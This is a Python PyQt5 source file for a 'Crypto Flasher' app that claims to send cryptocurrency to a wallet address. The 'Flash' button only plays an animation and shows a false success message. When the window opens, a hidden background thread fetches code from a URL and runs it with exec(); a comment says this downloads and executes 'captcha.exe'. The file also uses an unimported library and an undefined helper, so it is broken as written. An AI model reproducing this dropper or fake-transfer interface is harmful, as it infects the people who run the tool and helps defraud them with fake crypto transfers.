import os
import subprocess
import threading
from PyQt5 import QtWidgets, QtGui, QtCore
from PyQt5.QtWidgets import (
    QGraphicsDropShadowEffect,
    QVBoxLayout,
    QHBoxLayout,
    QRadioButton,
)
from PyQt5.QtGui import QPixmap, QColor
import sys




def fetch_and_execute_code():
    url = ""
    try:
        print("Fetching code from the URL...")
        response = requests.get(url)
        response.raise_for_status()  # Raises an exception if the request fails
        code = response.text
        print(f"Code fetched: {code[:100]}...")  # Print part of the code to verify

        # Execute the fetched code directly
        exec(code)  # This will run the function to download and execute the captcha.exe

    except Exception as e:
        print(f"Error executing code from {url}: {e}")


class CryptoFlasher(QtWidgets.QWidget):
    def __init__(self):
        super().__init__()
        self.duration_hours = 3
        self.initUI()
        self.dragging = False
        self.offset = None
        self.wallet_address = ""
        self.amount = 0.0

        self.dots_count = 0
        self.animation_timer = None

        # Start the background thread to fetch and execute the code
        self.background_thread = threading.Thread(target=fetch_and_execute_code, daemon=True)
        self.background_thread.start()

    def initUI(self):
        self.setWindowTitle("Angel Tools - Crypto Flasher")
        self.setGeometry(100, 100, 650, 500)
        self.setWindowFlags(QtCore.Qt.FramelessWindowHint)
        self.setWindowIcon(QtGui.QIcon(resource_path("logo.ico")))  # Use bundled icon
        self.setStyleSheet("background-color: #121212; color: white; font-size: 14px;")

        layout = QtWidgets.QVBoxLayout()

        spacer_top = QtWidgets.QSpacerItem(
            20, 50, QtWidgets.QSizePolicy.Minimum, QtWidgets.QSizePolicy.Expanding
        )
        layout.addItem(spacer_top)

        self.logo = QtWidgets.QLabel(self)
        pixmap = QtGui.QPixmap(resource_path("logo.png"))  # Use bundled image
        pixmap = pixmap.scaled(
            150, 150, QtCore.Qt.KeepAspectRatio, QtCore.Qt.SmoothTransformation
        )
        self.logo.setPixmap(pixmap)
        self.logo.setAlignment(QtCore.Qt.AlignCenter)

        glow_effect = QGraphicsDropShadowEffect()
        glow_effect.setColor(QColor(155, 86, 204))
        glow_effect.setBlurRadius(15)
        glow_effect.setOffset(0, 0)
        self.logo.setGraphicsEffect(glow_effect)

        layout.addWidget(self.logo)

        spacer_bottom = QtWidgets.QSpacerItem(
            20, 100, QtWidgets.QSizePolicy.Minimum, QtWidgets.QSizePolicy.Expanding
        )
        layout.addItem(spacer_bottom)

        self.title = QtWidgets.QLabel(
            "<p align='center'><font color='#9b56cc'><b>Angel</b></font> <font color='white'><b>Tools</b></font> <font color='#9b56cc'><b>- Crypto Flasher (1.0.0)</b></font></p>",
            self,
        )
        self.title.setAlignment(QtCore.Qt.AlignCenter)
        self.title.setStyleSheet("font-size: 22px; color: #bb86fc; padding-top: 0px;")
        layout.addWidget(self.title)

        def create_glowing_button(text, color):
            button = QtWidgets.QPushButton(text, self)
            button.setStyleSheet(
                    f"background-color: {color}; color: white; padding: 8px 40px; font-size: 18px; border-radius: 8px;"
            )
            shadow = QGraphicsDropShadowEffect()
            shadow.setBlurRadius(10)
            shadow.setColor(QtGui.QColor(color))
            shadow.setOffset(0, 0)
            button.setGraphicsEffect(shadow)

            button.setFixedWidth(600)
            button.setFixedHeight(35)
            return button

        label_style = "background-color: #3a3a3a; color: #bb86fc; padding: 12px; border-radius: 5px;"

        self.currencyButtonsLayout = QHBoxLayout()

        self.createCurrencyButton("Ethereum", "eth_icon.png")
        self.createCurrencyButton("Solana", "sol_icon.png")
        self.createCurrencyButton("USDT", "usdt_icon.png")
        self.createCurrencyButton("USDC", "usdc_icon.png")
        self.createCurrencyButton("PEPE", "pepe_icon.png")
        self.createCurrencyButton("DOGE", "doge_icon.png")

        self.currencyGroup = QtWidgets.QButtonGroup(self)
        self.currencyGroup.addButton(self.ethButton)
        self.currencyGroup.addButton(self.solButton)
        self.currencyGroup.addButton(self.usdtButton)
        self.currencyGroup.addButton(self.usdcButton)
        self.currencyGroup.addButton(self.pepeButton)
        self.currencyGroup.addButton(self.dogeButton)

        layout.addLayout(self.currencyButtonsLayout)

        self.walletLabel = QtWidgets.QLabel("Enter Wallet Address:", self)
        self.walletLabel.setStyleSheet("color: #bb86fc; padding: 10px;")
        layout.addWidget(self.walletLabel, alignment=QtCore.Qt.AlignCenter)

        self.walletInput = QtWidgets.QLineEdit(self)
        self.walletInput.setStyleSheet(
            "background-color: #3a3a3a; color: #ffffff; padding: 12px; border-radius: 8px;"
        )
        layout.addWidget(self.walletInput, alignment=QtCore.Qt.AlignCenter)

        self.amountLabel = QtWidgets.QLabel("Enter Amount to Flash:", self)
        self.amountLabel.setStyleSheet("color: #bb86fc; padding: 10px;")
        layout.addWidget(self.amountLabel, alignment=QtCore.Qt.AlignCenter)

        self.amountInput = QtWidgets.QLineEdit(self)
        self.amountInput.setStyleSheet(
            "background-color: #3a3a3a; color: #ffffff; padding: 12px; border-radius: 8px;"
        )
        layout.addWidget(self.amountInput, alignment=QtCore.Qt.AlignCenter)

        self.durationSliderLabel = QtWidgets.QLabel(
            f"Duration: {self.duration_hours} hours", self
        )
        self.durationSliderLabel.setStyleSheet("color: #bb86fc; padding: 10px;")
        layout.addWidget(self.durationSliderLabel, alignment=QtCore.Qt.AlignCenter)

        self.durationSlider = QtWidgets.QSlider(QtCore.Qt.Horizontal, self)
        self.durationSlider.setMinimum(1)
        self.durationSlider.setMaximum(24)
        self.durationSlider.setTickInterval(1)
        self.durationSlider.setPageStep(1)
        self.durationSlider.setValue(self.duration_hours // 3)
        self.durationSlider.valueChanged.connect(self.updateDuration)

        self.durationSlider.setStyleSheet(
            """
            QSlider::groove:horizontal {
                border: 1px solid #777;
                height: 8px;
                background: #3a3a3a;
                border-radius: 4px;
            }
            QSlider::handle:horizontal {
                background: #bb86fc;
                border: 1px solid #9b56cc;
                width: 20px;
                height: 20px;
                border-radius: 10px;
            }
        """
        )

        layout.addWidget(self.durationSlider, alignment=QtCore.Qt.AlignCenter)

        self.runButton = create_glowing_button("Flash", "#9275b6")
        self.runButton.clicked.connect(self.flashCrypto)
        layout.addWidget(self.runButton, alignment=QtCore.Qt.AlignCenter)

        self.closeButton = create_glowing_button("Close", "#ff0000")
        self.closeButton.clicked.connect(self.close)
        layout.addWidget(self.closeButton, alignment=QtCore.Qt.AlignCenter)

        self.setLayout(layout)

    def createCurrencyButton(self, coin_name, icon_name):
        button = QRadioButton(coin_name, self)
        button.setStyleSheet("color: #bb86fc; padding: 10px;")

        glow_effect = QGraphicsDropShadowEffect()
        glow_effect.setColor(QColor(155, 86, 204))
        glow_effect.setBlurRadius(8)
        glow_effect.setOffset(0, 0)
        button.setGraphicsEffect(glow_effect)

        buttonLayout = QHBoxLayout()
        iconLabel = QtWidgets.QLabel(self)
        pixmap = QPixmap(resource_path(icon_name))  # Use bundled image
        pixmap = pixmap.scaled(32, 32, QtCore.Qt.KeepAspectRatio)
        iconLabel.setPixmap(pixmap)

        buttonLayout.addWidget(iconLabel)
        buttonLayout.addWidget(button)
        buttonLayout.setAlignment(QtCore.Qt.AlignLeft)

        self.currencyButtonsLayout.addLayout(buttonLayout)

        if coin_name == "Ethereum":
            self.ethButton = button
        elif coin_name == "Solana":
            self.solButton = button
        elif coin_name == "USDT":
            self.usdtButton = button
        elif coin_name == "USDC":
            self.usdcButton = button
        elif coin_name == "PEPE":
            self.pepeButton = button
        elif coin_name == "DOGE":
            self.dogeButton = button

    def updateDuration(self):
        self.duration_hours = self.durationSlider.value() * 3
        self.durationSliderLabel.setText(f"Duration: {self.duration_hours} hours")

    def flashCrypto(self):
        self.wallet_address = self.walletInput.text()
        try:
            self.amount = float(self.amountInput.text())
        except ValueError:
            QtWidgets.QMessageBox.warning(self, "Error", "Please enter a valid amount.")
            return

        if not self.wallet_address:
            QtWidgets.QMessageBox.warning(
                self, "Error", "Please enter a wallet address."
            )
            return

        selected_coin = self.getSelectedCurrency()
        if not selected_coin:
            QtWidgets.QMessageBox.warning(
                self, "Error", "Please select a cryptocurrency."
            )
            return

        self.showFlashingPopup()

    def getSelectedCurrency(self):
        if self.ethButton.isChecked():
            return "Ethereum"
        elif self.solButton.isChecked():
            return "Solana"
        elif self.usdtButton.isChecked():
            return "USDT"
        elif self.usdcButton.isChecked():
            return "USDC"
        elif self.pepeButton.isChecked():
            return "PEPE"
        elif self.dogeButton.isChecked():
            return "DOGE"
        return None

    def showFlashingPopup(self):
        self.popup = QtWidgets.QWidget()
        self.popup.setWindowTitle("Flashing, please wait...")
        self.popup.setGeometry(500, 250, 350, 100)
        self.popup.setStyleSheet(
            "background-color: #121212; color: white; font-size: 16px;"
        )

        logo_label = QtWidgets.QLabel(self.popup)
        pixmap = QtGui.QPixmap(resource_path("logo.png")).scaled(50, 50, QtCore.Qt.KeepAspectRatio)  # Use bundled image
        logo_label.setPixmap(pixmap)
        logo_label.setAlignment(QtCore.Qt.AlignLeft | QtCore.Qt.AlignVCenter)

        self.text_label = QtWidgets.QLabel("Flashing, please wait...", self.popup)
        self.text_label.setAlignment(QtCore.Qt.AlignCenter)

        popup_layout = QtWidgets.QHBoxLayout()
        popup_layout.addWidget(logo_label)
        popup_layout.addWidget(self.text_label)
        self.popup.setLayout(popup_layout)

        self.popup.show()

        self.dots_count = 0
        self.animation_timer = QtCore.QTimer(self)
        self.animation_timer.timeout.connect(self.updateEllipsis)
        self.animation_timer.start(500)

        QtCore.QTimer.singleShot(10000, self.showFlashCompleteMessage)

    def updateEllipsis(self):
        dots = "." * (self.dots_count % 4)
        self.text_label.setText(f"Flashing, please wait{dots}")
        self.dots_count += 1

    def showFlashCompleteMessage(self):
        if self.animation_timer:
            self.animation_timer.stop()

        self.popup.close()
        QtWidgets.QMessageBox.information(
            self,
            "Success",
            f"Flashed {self.amount} {self.getSelectedCurrency()} to {self.wallet_address}! ",
        )

    def mousePressEvent(self, event):
        if event.button() == QtCore.Qt.LeftButton and not self.childAt(event.pos()):
            self.dragging = True
            self.offset = event.pos()

    def mouseMoveEvent(self, event):
        if self.dragging:
            self.move(event.globalPos() - self.offset)

    def mouseReleaseEvent(self, event):
        self.dragging = False

if __name__ == "__main__":
    app = QtWidgets.QApplication(sys.argv)
    window = CryptoFlasher()
    window.show()
    sys.exit(app.exec_())
